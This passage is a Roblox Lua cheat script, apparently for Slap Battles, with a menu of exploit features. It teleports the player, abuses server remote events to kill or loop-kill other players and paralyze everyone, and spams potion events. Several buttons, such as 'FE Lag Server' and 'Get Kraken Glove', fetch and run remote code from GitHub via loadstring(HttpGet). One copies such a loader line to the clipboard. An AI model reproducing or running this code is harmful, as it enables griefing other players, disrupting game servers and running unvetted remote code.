                        Image = "rbxassetid://17748409757",
                        Time = 5
                    })
  end
end
})
TabBadges:AddButton({
  Name = "Stop Voodoo Farm",
  Callback = function()
   local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
 local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")

    local newCFrame = CFrame.new(40.6329346, -3.69798946, 17.1903038, 0.172667935, -0.0038329165, 0.984972656, -1.42282324e-05, 0.99999243, 0.00389386038, -0.984980106, -0.00068636972, 0.172666565)

    humanoid.RootPart.CFrame = newCFrame
end
})


TabBadges:AddButton({
  Name = "Fish Farm",
  Callback = function()
    local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

if game.Players.LocalPlayer.Character:FindFirstChild("entered") and game.Players.LocalPlayer.leaderstats.Glove.Value == "ZZZZZZZ" and 
character:FindFirstChild("ZZZZZZZ") then
 
 local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")

    local newCFrame = CFrame.new(5597.26465, 181.799469, -146.706467, -0.435461491, 0.00667448156, 0.900182664, -1.16910187e-05, 0.999972463, -0.00742003508, -0.9002074, -0.00324165984, -0.435449421)

    humanoid.RootPart.CFrame = newCFrame
 wait(0.1)
  game:GetService("VirtualInputManager"):SendKeyEvent(true,"E",false,x)
  wait(0.1)
  local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
else
  OrionLib:MakeNotification({
                        Name = "Ops",
                        Content = "You need to equip ZZZZ and join the arena",
                        Image = "rbxassetid://17748409757",
                        Time = 5
                    })
  end
end
})

TabBadges:AddButton({
  Name = "Stop Fish Farm",
  Callback = function()
game:GetService("VirtualInputManager"):SendKeyEvent(true,"E",false,x)
wait(0.5)
   local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
 local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")

    local newCFrame = CFrame.new(40.6329346, -3.69798946, 17.1903038, 0.172667935, -0.0038329165, 0.984972656, -1.42282324e-05, 0.99999243, 0.00389386038, -0.984980106, -0.00068636972, 0.172666565)

    humanoid.RootPart.CFrame = newCFrame
end
})

TabBadges:AddButton({
  Name = "Get Kraken Glove",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/patrociuq123/destsecretplace/main/KrakenScript.lua"))()
end
})

TabTrolling:AddTextbox({
  Name = "Kick Player",
  Default = "User",
  TextDisappear = false,
  Callback = function(Value)
TargetKicked = Value
		local matchedPlayer = nil
		local shortestDistance = math.huge

		for _, player in ipairs(Players:GetPlayers()) do
			local distance = string.len(player.Name) - string.len(Value)
			if string.sub(player.Name, 1, #Value):lower() == Value:lower() and distance < shortestDistance then
				matchedPlayer = player
				shortestDistance = distance
			end
		end

		if matchedPlayer then
TargetKicked = matchedPlayer.Name
print("Find" .. matchedPlayer.Name)
		else
			            OrionLib:MakeNotification({
                Name = "Didn't find this player",
                Content = "This player does not exist",
                Image = "rbxassetid://17748409757",
                Time = 5
            })   
		end
end
})

TabTrolling:AddButton({
  Name = "Kick the player",
  Callback = function()
    if game.Players.LocalPlayer.leaderstats.Glove.Value == "Recall" then
            local position = CFrame.new(-732.574097, 306.27005, -1.09629261, -0.0223243386, 0.0153695755, -0.999632657, -2.04585031e-05, 0.999881864, 0.0153738642, 0.999750793, 0.000363676081, -0.0223213844)
            local transparency = 1

            local part = Instance.new("Part")
            part.Size = Vector3.new(100, 1.5, 100)
            part.Position = position.p
            part.Anchored = true
            part.Transparency = transparency
            part.Parent = game.Workspace
            wait(2)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(-723.266052, 310.018982, -0.0775156692, -0.473462105, -9.27528063e-08, -0.880814195, -2.28346426e-08, 1, -9.30292359e-08, 0.880814195, -2.39327402e-08, -0.473462105)

            humanoid.RootPart.CFrame = newCFrame
            wait(0.5)
            local args = {
                [1] = game:GetService("Players").LocalPlayer.Character.Recall,
                [2] = Vector3.new(55.76399230957031, -5.172937870025635, 45.26799011230469)
            }

            game:GetService("ReplicatedStorage"):WaitForChild("Recall"):InvokeServer(unpack(args))

            wait(2.4)
                    local Player = game.Players:FindFirstChild(TargetKicked)
        if Player then
            game.Players.LocalPlayer.Character:MoveTo(Player.Character.HumanoidRootPart.Position)
        end
        else
                              OrionLib:MakeNotification({
                        Name = "Ops",
                        Content = "You need to equip recall and hold the glove first.",
                        Image = "rbxassetid://17748409757",
                        Time = 5
                    })
 end
end
})


local TeleportTarget = ""
local TeleportType = "Select a Type"

local Players = game:GetService("Players")
local TeleportTarget = ""

TabMisc:AddTextbox({
	Name = " Teleport to Player",
	Default = "User",
	TextDisappear = true,
	Callback = function(Value)
		TeleportTarget = Value
		local matchedPlayer = nil
		local shortestDistance = math.huge

		for _, player in ipairs(Players:GetPlayers()) do
			local distance = string.len(player.Name) - string.len(Value)
			if string.sub(player.Name, 1, #Value):lower() == Value:lower() and distance < shortestDistance then
				matchedPlayer = player
				shortestDistance = distance
			end
		end

		if matchedPlayer then
TeleportTarget = matchedPlayer.Name
print("Find" .. matchedPlayer.Name)
		else
			            OrionLib:MakeNotification({
                Name = "Didn't find this player",
                Content = "This player does not exist",
                Image = "rbxassetid://17748409757",
                Time = 5
            })   
		end
	end	  
})

TabMisc:AddDropdown({
    Name = " Teleport Type",
    Default = "Select a Type",
    Options = {"Select a Type", "Instantly", "Tween"},
    Callback = function(Value)
        Type = Value
    end
})

TabMisc:AddButton({
    Name = "Teleport",
    Callback = function()
        if TeleportType == "Tween" then
            local TweenService = game:GetService("TweenService")
            local Players = game:GetService("Players")

            local player = Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()

            local targetPlayerName = TeleportTarget
            local targetPlayer = Players:FindFirstChild(targetPlayerName)

            if not targetPlayer then
                warn("Player " .. targetPlayerName .. " not found")
                return
            end

            local function teleportToPlayer()
                local targetCharacter = targetPlayer.Character
                if not targetCharacter then
                    warn("Target character not found")
                    return
                end

                local targetPosition = targetCharacter:WaitForChild("HumanoidRootPart").Position
                local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
                
                local distance = (targetPosition - humanoidRootPart.Position).magnitude

                local studsPerSecond = 100
                local duration = distance / studsPerSecond

                local tweenInfo = TweenInfo.new(
                    duration, 
                    Enum.EasingStyle.Quad, 
                    Enum.EasingDirection.Out, 
                    0, 
                    false, 
                    0 
                )

                local goal = {}
                goal.CFrame = CFrame.new(targetPosition)

                local tween = TweenService:Create(humanoidRootPart, tweenInfo, goal)

                tween:Play()

                tween.Completed:Connect(function()
                    humanoidRootPart.CFrame = CFrame.new(targetPosition)
                end)
            end

            teleportToPlayer()
        elseif TeleportType == "Instantly" then
            local Player = game.Players:FindFirstChild(TeleportTarget)
            if Player then
                game.Players.LocalPlayer.Character:MoveTo(Player.Character.HumanoidRootPart.Position)
            else
                warn("Player " .. TeleportTarget .. " not found")
            end
        elseif TeleportType == "Select a Type" then
            OrionLib:MakeNotification({
                Name = "Ops",
                Content = "You need to select a teleport type first.",
                Image = "rbxassetid://4483345998",
                Time = 5
            })   
        end
    end
})

TabTrolling:AddToggle({
    Name = "Auto Kick Arena Players",
    Default = false,
    Callback = function(Value)
        AutoKickA = Value
        while AutoKickA do
                local position = CFrame.new(-732.574097, 306.27005, -1.09629261, -0.0223243386, 0.0153695755, -0.999632657, -2.04585031e-05, 0.999881864, 0.0153738642, 0.999750793, 0.000363676081, -0.0223213844)
                local transparency = 1

                local part = Instance.new("Part")
                part.Size = Vector3.new(100, 1.5, 100)
                part.Position = position.p
                part.Anchored = true
                part.Transparency = transparency
                part.Parent = game.Workspace
                wait(2)

                local player = game.Players.LocalPlayer
                local character = player.Character or player.CharacterAdded:Wait()
                local humanoid = character:WaitForChild("Humanoid")

                local newCFrame = CFrame.new(-723.266052, 310.018982, -0.0775156692, -0.473462105, -9.27528063e-08, -0.880814195, -2.28346426e-08, 1, -9.30292359e-08, 0.880814195, -2.39327402e-08, -0.473462105)

                humanoid.RootPart.CFrame = newCFrame
                wait(0.5)

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Recall,
                    [2] = Vector3.new(55.76399230957031, -5.172937870025635, 45.26799011230469)
                }

                game:GetService("ReplicatedStorage"):WaitForChild("Recall"):InvokeServer(unpack(args))

                wait(2.4)

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
            wait(0.1)
            end
      end

})


TabImmunity:AddToggle({
        Name = "Anti-Mail",
        Default = false,
        Callback = function(Value)
  AntiMail = Value
if AntiMail == true then 
  local RepStorage = game:GetService("ReplicatedStorage")

local MailPopup = RepStorage:FindFirstChild("MailPopup")
if MailPopup then
    MailPopup.Enabled = false
end
else 
  local RepStorage = game:GetService("ReplicatedStorage")

local MailPopup = RepStorage:FindFirstChild("MailPopup")
if MailPopup then
    MailPopup.Enabled = true
    end
  end
end
})




TabBadges:AddToggle({
  Name = "Auto Click Tycoon ",
  Default = false,
  Callback = function(Value)
_G.TycoonClick = Value
while _G.TycoonClick do
for _, player in ipairs(game.Players:GetPlayers()) do
    local playerName = player.Name
    local tycoonName = "ÅTycoon" .. playerName
    local tycoon = game.Workspace:FindFirstChild(tycoonName)

    if tycoon then
        local clickPart = tycoon:FindFirstChild("Click")
        if clickPart and clickPart:FindFirstChild("ClickDetector") then
            fireclickdetector(clickPart.ClickDetector)
        else
            warn("Click part or ClickDetector not found for " .. tycoonName)
        end
    else
        warn("Tycoon not found for " .. playerName)
    end
    end
wait(0.1)
  end
end
})

TabMisc:AddButton({
  Name = "Server Hop Farming ",
  Callback = function()
    setclipboard('loadstring(game:HttpGet("https://raw.githubusercontent.com/patrociuq123/SBScript/main/SlappleFarmv2.lua"))()')
    wait(0.1)
    OrionLib:MakeNotification({
    Name = "Set to Clipboard",
    Content = "The script is now on your clipboard",
    Image = "rbxassetid://17748409757",
    Time = 5
})
end
})



TabTeleports:AddButton({
  Name = "Cannon Rocket Man",
  Callback = function()
  firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), workspace.Lobby.Teleport1.TouchInterest.Parent, 0)
  wait(0.4)
  
    local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(228.312256, 47.1651993, 170.029755, 0.466871083, 1.7866002e-08, 0.884325385, -1.92082279e-08, 1, -1.00621724e-08, -0.884325385, -1.22885861e-08, 0.466871083)
character:SetPrimaryPartCFrame(cframe)
wait(0.3)
game:GetService("VirtualInputManager"):SendKeyEvent(true,"Q",false,x)
wait(0.1)
game:GetService("VirtualInputManager"):SendKeyEvent(true,"Q",false,x)
end
})

TabTeleports:AddButton({
  Name = "Teleport to Kraken ",
  Callback = function()
    OrionLib:MakeNotification({
                        Name = "Warning",
                        Content = "This can't get you the badge",
                        Image = "rbxassetid://4483345998",
                        Time = 5
                    })
wait(0.1)
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local abyssPath = ReplicatedStorage:WaitForChild("AbyssAssets"):WaitForChild("Abyss")

if abyssPath then
    abyssPath.Parent = Workspace
    print("Teleporting to Kraken")
else
    print("The teleport falied")
end
wait(0.1)
local jogador = game.Players.LocalPlayer
local destinoCFrame = CFrame.new(196.006683, 34.9935608, -12685.6885, 0.999948859, 5.73463659e-08, 0.0101139452, -5.73381023e-08, 1, -1.10696718e-09, -0.0101139452, 5.26996113e-10, 0.999948859)
jogador.Character:SetPrimaryPartCFrame(destinoCFrame)
end
})

TabMisc:AddToggle({
  Name = "Arena Cannon Spam",
  Default = false,
  Callback = function(Value)
    CannonSpam = Value
    while CannonSpam do

      local VirtualInputManager = game:GetService("VirtualInputManager")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- ar o jogador
firetouchinterest(character:WaitForChild("Head"), workspace.Lobby.Teleport1.TouchInterest.Parent, 0)
wait(0.4)

-- Definir a posição do jogador
local cframe = CFrame.new(228.312256, 47.1651993, 170.029755, 0.466871083, 1.7866002e-08, 0.884325385, -1.92082279e-08, 1, -1.00621724e-08, -0.884325385, -1.22885861e-08, 0.466871083)
character:SetPrimaryPartCFrame(cframe)
wait(0.3)

-- Pressionar a tecla "Q" duas vezes
VirtualInputManager:SendKeyEvent(true, "Q", false, game)
wait(0.1)
VirtualInputManager:SendKeyEvent(false, "Q", false, game)
wait(0.1)
VirtualInputManager:SendKeyEvent(true, "Q", false, game)
wait(0.1)
VirtualInputManager:SendKeyEvent(false, "Q", false, game)
wait(0.4)

-- Função para simular cliques
local function simulateClick(x, y)
    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
    wait(0.1)
    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
end

-- Coordenadas para o clique
local x, y = 656, 276

-- Loop para repetir o clique 7 vezes
for i = 1, 12 do
    simulateClick(x, y)
    wait(0.1)
end

-- Executar um clique extra
simulateClick(656, 276)
wait(0.1)

print("starting click")
wait(1.8)

-- Simular outro clique em diferentes coordenadas
simulateClick(624, 216)
wait(1.8)
 end
end
})

TabBadges:AddButton({
  Name = "Get Psycho Glove",
  Callback = function()
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(18433.9688, 2954.79688, -227.702301, -0.0292471685, 4.75555417e-08, 0.999572217, 2.62747868e-08, 1, -4.68071022e-08, -0.999572217, 2.48945717e-08, -0.0292471685)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(18410.9941, 2957.76538, -228.542694, -0.00704872375, -1.9542739e-08, 0.999975145, 1.52428701e-08, 1, 1.96506704e-08, -0.999975145, 1.53810031e-08, -0.00704872375)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(18384.4219, 2953.50903, -228.760269, 0.0593962632, 0, 0.99823451, 0, 1, -0, -0.99823451, 0, 0.0593962632)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(18277.2363, 2950.49927, -228.56517, 0.0720095038, 0, 0.99740392, 0, 1.00000012, -0, -0.997404039, 0, 0.0720094964)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(18182.0371, 2952.06299, -298.260864, 0.153609082, 0, 0.988131642, 0, 1, -0, -0.988131762, 0, 0.153609067)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(18112.4668, 2950.49927, -324.444214, 0.0655722097, 0, 0.997847855, 0, 1.00000012, -0, -0.997847855, 0, 0.0655722097)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(17987.1699, 2950.49927, -310.103943, -0.427469373, 0, 0.904029906, 0, 1.00000012, -0, -0.904029787, 0, -0.427469432)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(17883.3184, 2950.49927, -249.275635, -0.891610086, 0, -0.452803999, 0, 1, -0, 0.452803999, -0, -0.891610086)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(17817.5879, 2950.49927, -183.453171, -0.748862207, 0, 0.662725747, 0, 1, -0, -0.662725806, 0, -0.7488621475)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(17724.498, 2950.49927, -90.6103363, -0.691430271, 0, 0.722443223, 0, 1, -0, -0.722443283, 0, -0.691430211)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(17650.5645, 2950.49927, 19.9496326, -0.857966721, 0, 0.513705432, 0, 1.00000012, -0, -0.513705492, 0, -0.857966602)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(17630.332, 2950.49927, 66.538269, -0.900164485, 0, 0.435550094, 0, 1, -0, -0.435550094, 0, -0.900164485)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(17551.8301, 2950.49927, 58.7060394, -0.433719426, 0, 0.901048005, 0, 1, -0, -0.901048005, 0, -0.433719426)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(17533.5547, 2950.49927, 118.831253, -0.263351113, 0, 0.964700043, 0, 1, -0, -0.964700043, 0, -0.263351113)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(17463.3086, 2950.49927, 109.750992, 0.118588358, 0, 0.992943466, 0, 1, -0, -0.992943585, 0, 0.118588343)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(17341.959, 2939.62866, 102.637894, 0.0639834777, 6.35186925e-09, 0.997950971, -4.28589914e-10, 1, -6.33743191e-09, -0.997950971, -2.22207669e-11, 0.0639834777)

            humanoid.RootPart.CFrame = newCFrame
 wait(0.1)           
            local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(3.5)
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(18775.7441, 2995.6626, -226.944122, -0.331906497, 1.60290403e-09, 0.943312287, 4.2932971e-08, 1, 1.34068312e-08, -0.943312287, 4.49490152e-08, -0.331906497)

            humanoid.RootPart.CFrame = newCFrame
end
})

TabTrolling:AddButton({
  Name = "FE Lag Server",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/patrociuq123/destsecretplace/main/FELagServer.lua"))()
end
})

TabTrolling:AddTextbox({
    Name = "Loopkill Player",
    Default = "User",
    TextDisappear = false,
    Callback = function(Value)
        LoopKTarget = Value
        local matchedPlayer = nil
        local shortestDistance = math.huge

        for _, player in ipairs(game.Players:GetPlayers()) do
            local distance = string.len(player.Name) - string.len(Value)
            if string.sub(player.Name, 1, #Value):lower() == Value:lower() and distance < shortestDistance then
                matchedPlayer = player
                shortestDistance = distance
            end
        end

        if matchedPlayer then
            LoopKTarget = matchedPlayer.Name
            print("Found " .. matchedPlayer.Name)
        else
            OrionLib:MakeNotification({
                Name = "Didn't find this player",
                Content = "This player does not exist",
                Image = "rbxassetid://17748409757",
                Time = 5
            })
        end
    end
})

TabTrolling:AddToggle({
    Name = "LoopKill Player",
    Default = false,
    Callback = function(Value)
        LoopKi = Value
        local localPlayer = game.Players.LocalPlayer

        if localPlayer.leaderstats.Glove.Value == "Error" then
            while LoopKi do
                local targetPlayer = game:GetService("Players"):FindFirstChild(LoopKTarget)
                if targetPlayer and targetPlayer.Character then
                    local targetCharacter = targetPlayer.Character
                    local enteredValue = targetCharacter:FindFirstChild("entered")

                    if enteredValue and enteredValue.Value == true then
                        -- Save current position
                        local originalCFrame = localPlayer.Character.HumanoidRootPart.CFrame
                        
                        --  to target
                        localPlayer.Character.HumanoidRootPart.CFrame = targetCharacter.HumanoidRootPart.CFrame
wait(0.1)
                        -- Execute the action
                        local args = {
                            [1] = targetCharacter:FindFirstChild("Left Arm")
                        }

                        game:GetService("ReplicatedStorage"):WaitForChild("Errorhit"):FireServer(unpack(args))

                        -- Return to original position
                        wait(0.5)  -- Small delay to ensure the action is performed
                        localPlayer.Character.HumanoidRootPart.CFrame = originalCFrame
                    end
                else
                    OrionLib:MakeNotification({
                        Name = "Error",
                        Content = "Target player not found or does not exist",
                        Image = "rbxassetid://17748409757",
                        Time = 5
                    })
                end

                wait(1)  -- Wait before the next loop iteration
            end
        end
    end
})


TabTrolling:AddButton({
	Name = "Kill all",
	Callback = function()
		if game.Players.LocalPlayer.leaderstats.Glove.Value == "Alchemist" then
			local player = game.Players.LocalPlayer
			local character = player.Character or player.CharacterAdded:Wait()

			local cframe = CFrame.new(17896.1797, -128.664368, -3544.22412, -0.999756634, -0.000100836049, -0.0220624395, -3.8296148e-06, 0.999990463, -0.00439669611, 0.0220626704, -0.00439554127, -0.999746978)

			if character and character.PrimaryPart then
				character:SetPrimaryPartCFrame(cframe)
			else
				print("Character or PrimaryPart not found.")
				return
			end

			wait(0.3)
			game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
			wait(0.2)

			local addItems = {"Dark Root", "Blood Rose"}
			for _, item in ipairs(addItems) do
				for i = 1, 100 do
					game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent"):FireServer("AddItem", item)
				end
			end

			wait(0.001)

			for i = 1, 40 do
				for j = 1, 10 do
					game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent"):FireServer("MixItem", "Dark Root")
					game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent"):FireServer("MixItem", "Blood Rose")
				end
				game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent"):FireServer("BrewPotion")
			end

			wait(0.001)

			local function GetRandomPlayer()
				local players = game.Players:GetPlayers()
				local randomIndex = math.random(1, #players)
				return players[randomIndex]
			end

			local function TeleportToRandomPlayer(player)
				local randomPlayer = GetRandomPlayer()
				if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
					player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
				else
					print("No available or valid player to Teleport Teleport to.")
				end
			end

			for i = 1, 30 do
				if player then
					TeleportToRandomPlayer(player)
					game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent"):FireServer("UsePotion", "Lethal Poison", true)
				else
					print("No Players to Teleport.")
				end
				wait(0.01)
			end
		else
			OrionLib:MakeNotification({
				Name = "Ops",
				Content = "You need to equip Alchemist First",
				Image = "rbxassetid://17748409757",
				Time = 5
			})
		end
	end
})


TabMisc:AddButton({
    Name = "Get Alchemist Ingredients (Not all)",
    Callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character
        local leaderstats = player:FindFirstChild("leaderstats")

        if character and character:FindFirstChild("entered") and leaderstats and leaderstats:FindFirstChild("Glove").Value == "Alchemist" then
            local alchemistEvent = game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent", 10)
            
            if not alchemistEvent then
                OrionLib:MakeNotification({
                    Name = "Ops",
                    Content = "Failed to find AlchemistEvent",
                    Image = "rbxassetid://17748409757",
                    Time = 5
                })
                return
            end

            local items = {"Dark Root", "Mushroom", "Dark Root", "Fire Flower", "Blood Rose", "Plane Flower", "Blue Crystal"}
            
            for i = 1, 250 do
                for _, item in ipairs(items) do
                    local args = { [1] = "AddItem", [2] = item }
                    if item == "Blue Crystal" then
                        args[1] = "EquipItem"
                    end
                    alchemistEvent:FireServer(unpack(args))
                end
                wait(0.001)
            end
        else
            OrionLib:MakeNotification({
                Name = "Ops",
                Content = "You need to equip Alchemist and Join the Arena",
                Image = "rbxassetid://17748409757",
                Time = 5
            })
        end
    end
})

TabMisc:AddButton({
    Name = "Get Cake Mix",
    Callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character
        local leaderstats = player:FindFirstChild("leaderstats")

        if character and character:FindFirstChild("entered") and leaderstats and leaderstats:FindFirstChild("Glove").Value == "Alchemist" then
            local alchemistEvent = game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent", 10)
            
            if not alchemistEvent then
                OrionLib:MakeNotification({
                    Name = "Ops",
                    Content = "Failed to find AlchemistEvent",
                    Image = "rbxassetid://17748409757",
                    Time = 5
                })
                return
            end

            local args = { [1] = "AddItem", [2] = "Cake Mix" }
            alchemistEvent:FireServer(unpack(args))
        else
            OrionLib:MakeNotification({
                Name = "Ops",
                Content = "You need to equip Alchemist and be in the arena",
                Image = "rbxassetid://17748409757",
                Time = 5
            }) 
        end
    end
})




TabTrolling:AddButton({
	Name = "Paralyze all",
	Callback = function()
		if game.Players.LocalPlayer.leaderstats.Glove.Value == "Alchemist" then
			local player = game.Players.LocalPlayer
			local character = player.Character or player.CharacterAdded:Wait()

			local cframe = CFrame.new(17896.1797, -128.664368, -3544.22412, -0.999756634, -0.000100836049, -0.0220624395, -3.8296148e-06, 0.999990463, -0.00439669611, 0.0220626704, -0.00439554127, -0.999746978)

			if character and character.PrimaryPart then
				character:SetPrimaryPartCFrame(cframe)
			else
				print("Character or PrimaryPart not found.")
				return
			end

			wait(0.3)
			game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
			wait(0.2)

